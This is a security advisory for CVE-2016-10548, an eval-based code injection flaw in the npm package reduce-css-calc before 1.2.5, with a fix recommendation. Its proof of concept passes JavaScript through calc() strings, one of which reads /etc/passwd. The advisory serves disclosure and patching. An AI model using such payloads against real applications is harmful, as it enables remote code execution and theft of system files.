# [C] Arbitrary Code Injection in reduce-css-calc

## Summary
Severity: Critical
Advisory: GHSA-4662-j96g-mv46
CVE: CVE-2016-10548
CWE: CWE-94
Ecosystem: npm
Published: 2018-06-07
Source: https://github.com/advisories/GHSA-4662-j96g-mv46
Type: github-advisory

## Affected
- npm: `reduce-css-calc` — affected >=0 <1.2.5

## Details
Affected versions of `reduce-css-calc` pass input directly to `eval`. If user input is passed into the calc function, this may result in cross-site scripting on the browser, or remote code execution on the server.

## Proof of Concept

```
const reduceCSSCalc = require('reduce-css-calc');
console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
console.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));
console.log(reduceCSSCalc(`calc(                       (fs['readFileSync']("/etc/passwd", "utf-8")))`));
```



## Recommendation

Update to version 1.2.5 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2016-10548
- https://gist.github.com/ChALkeR/415a41b561ebea9b341efbb40b802fc9
- https://github.com/advisories/GHSA-4662-j96g-mv46
- https://www.npmjs.com/advisories/144
